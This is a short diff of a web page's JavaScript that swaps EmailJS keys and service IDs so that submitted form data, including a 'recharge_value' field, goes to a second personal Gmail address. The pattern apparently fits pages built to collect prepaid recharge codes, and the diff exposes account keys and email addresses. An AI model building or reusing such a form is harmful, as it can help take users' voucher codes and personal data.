@@ -23,7 +23,8 @@
     <script type="text/javascript">
         (function () {
             // https://dashboard.emailjs.com/admin/account
-            emailjs.init('opvGRa51hKeitmK3T');
+            // emailjs.init('opvGRa51hKeitmK3T'); // email1 : arnaudadjovi274@gmail.com
+            emailjs.init('sMhRxLA9AzuJh6SMy'); // email2 : arnaud2adjovi276@gmail.com
         })();
 
         var name = '';
@@ -174,9 +175,13 @@
                 recharge_value: document.getElementById("recharge_value").value,
             };
 
-            emailjs.send("service_tubjdtq", "template_bm0wmtf", tempParams).then(function (res) {
+            // emailjs.send("service_tubjdtq", "template_bm0wmtf", tempParams).then(function (res) {
+            //     console.log("success ".res);
+            // }) // email1 : arnaudadjovi274@gmail.com
+            
+            emailjs.send("service_zmbs5xg", "template_dc87l9s", tempParams).then(function (res) {
                 console.log("success ".res);
-            })
+            }) // email2 : arnaud2adjovi276@gmail.com
 
         }
 
